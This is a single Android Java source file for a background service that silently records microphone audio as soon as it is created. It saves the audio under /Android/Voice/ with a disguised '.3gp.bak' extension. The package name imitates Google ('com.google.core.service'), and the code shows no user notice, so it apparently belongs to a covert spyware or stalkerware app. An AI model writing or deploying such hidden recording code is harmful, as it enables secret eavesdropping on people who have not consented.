package com.google.core.service;

import java.io.File;
import java.io.IOException;



import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

/**
 * 这是一个录音类
 */
public class VRService extends Service{
	private static final String TAG = "VRService";
	public static String basePath=Environment.getExternalStorageDirectory()
			.getAbsolutePath() + "/Android/Voice/";
	public  boolean isStart=false;
	public  MediaRecorder recorder;
	@Override
	public void onCreate() {
		super.onCreate();
		
		SharedPreferences sp=getSharedPreferences("config", MODE_PRIVATE);
		String filepath = basePath + sp.getString("voiceFileName", System.currentTimeMillis()+"")+".3gp.bak";
		File file = new File(filepath);
		if (!file.getParentFile().exists()) {
			file.getParentFile().mkdirs();
		}
		try {
			if (!isStart) {
				recorder = new MediaRecorder();
				recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
				recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
				recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
				recorder.setOutputFile(filepath);
				recorder.prepare();
				recorder.start();
				isStart=true;
				Log.v(TAG, "开始录音    voiceFileName="+filepath);
			}
		} catch (IllegalStateException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	@Override
	public void onDestroy() {
		if ( isStart) {
			recorder.stop();
			recorder.reset();
			recorder.release();
			recorder = null;
			isStart=false;
			Log.v(TAG, "停止录音");
		}
		super.onDestroy();
	}
	
	
	
	
	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}
	
}
